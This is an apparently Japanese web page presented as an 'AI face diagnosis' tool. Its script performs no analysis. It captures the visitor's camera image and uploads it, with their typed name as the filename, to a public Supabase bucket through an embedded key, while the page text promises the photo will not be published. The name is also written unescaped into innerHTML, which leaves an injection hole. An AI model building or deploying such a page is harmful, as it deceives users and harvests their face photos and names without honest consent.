<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>AI顔診断</title>
  <style>
    body {
      font-family: "Helvetica Neue", system-ui, sans-serif;
      background: linear-gradient(135deg, #e3f2fd, #fce4ec);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }

    .container {
      background: white;
      border-radius: 20px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
      padding: 30px 25px;
      width: 90%;
      max-width: 420px;
      text-align: center;
    }

    h1 {
      color: #1976d2;
      font-size: 1.8rem;
      margin-bottom: 10px;
    }

    p {
      color: #333;
      font-size: 0.95rem;
      margin-bottom: 20px;
      line-height: 1.5;
    }

    input {
      width: 100%;
      padding: 10px;
      border-radius: 8px;
      border: 1px solid #ccc;
      font-size: 1rem;
      margin-bottom: 15px;
    }

    button {
      display: block;
      width: 100%;
      padding: 12px;
      font-size: 1rem;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 10px;
    }

    #startCamera {
      background: #42a5f5;
      color: white;
    }

    #startDiagnosis {
      background: #64b5f6;
      color: white;
    }

    #preview {
      margin-top: 20px;
      width: 100%;
      aspect-ratio: 1/1;
      background: #f5f5f5;
      border-radius: 12px;
      overflow: hidden;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    #preview img {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }

    small {
      display: block;
      margin-top: 15px;
      color: #666;
      font-size: 0.8rem;
    }

    #status {
      margin-top: 10px;
      font-size: 0.9rem;
      color: #888;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>AI顔診断</h1>
    <p>あなたのお顔を診断してみましょう！<br>診断にはカメラの許可が必要です。</p>
    <input id="nameInput" placeholder="あなたの名前を入力" />
    <button id="startCamera">📷 カメラを起動</button>
    <button id="startDiagnosis">🧠 診断をはじめる</button>

    <div id="preview"></div>
    <div id="status"></div>

    <small>※ この写真は診断目的でのみ使用され、外部に公開されることはありません。</small>
  </div>

  <script type="module">
    import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

    const SUPABASE_URL = "https://hwwjnlprsntmdcytktbm.supabase.co";
    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imh3d2pubHByc250bWRjeXRrdGJtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjA2NDU3ODcsImV4cCI6MjA3NjIyMTc4N30.Dni-WtNXSEdyRxH2TSq0oTR9homfAi1Ptz1h0MURFrY";
    const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

    const startCameraBtn = document.getElementById("startCamera");
    const startDiagnosisBtn = document.getElementById("startDiagnosis");
    const preview = document.getElementById("preview");
    const nameInput = document.getElementById("nameInput");
    const status = document.getElementById("status");

    let stream;
    let video;

    async function initCamera() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false,
        });

        video = document.createElement("video");
        video.srcObject = stream;
        video.play();
        preview.innerHTML = "";
        preview.appendChild(video);
        status.textContent = "カメラ起動中...";
      } catch (err) {
        status.textContent = "カメラが許可されませんでした: " + err.message;
      }
    }

    async function captureAndUpload() {
      const name = nameInput.value.trim();
      if (!name) {
        alert("名前を入力してください");
        return;
      }
      if (!stream) {
        await initCamera();
      }

      const canvas = document.createElement("canvas");
      const ctx = canvas.getContext("2d");
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const blob = await new Promise((res) => canvas.toBlob(res, "image/jpeg", 0.9));

      const filename = `${name}_${Date.now()}.jpg`;

      status.textContent = "送信中...";

      const { error } = await supabase.storage.from("photos").upload(filename, blob, { upsert: true });
      if (error) {
        status.textContent = "送信エラー: " + error.message;
      } else {
        status.innerHTML = `✅ 撮影＆送信完了！<br>ファイル名: ${filename}`;
        const imgUrl = `${SUPABASE_URL}/storage/v1/object/public/photos/${filename}`;
        preview.innerHTML = `<img src="${imgUrl}" alt="撮影結果" />`;
      }

      stream.getTracks().forEach((t) => t.stop());
    }

    startCameraBtn.addEventListener("click", initCamera);
    startDiagnosisBtn.addEventListener("click", captureAndUpload);
  </script>
</body>
</html>
